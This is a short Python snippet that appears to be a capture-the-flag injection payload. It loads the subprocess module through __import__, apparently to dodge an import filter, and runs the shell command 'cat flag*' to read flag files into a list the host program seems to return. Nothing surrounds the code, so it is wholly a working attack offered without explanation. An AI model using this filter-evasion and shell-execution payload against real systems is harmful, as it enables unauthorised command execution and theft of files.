x = __import__("subprocess")
images = []
images.append(x.check_output('cat flag*', shell=True))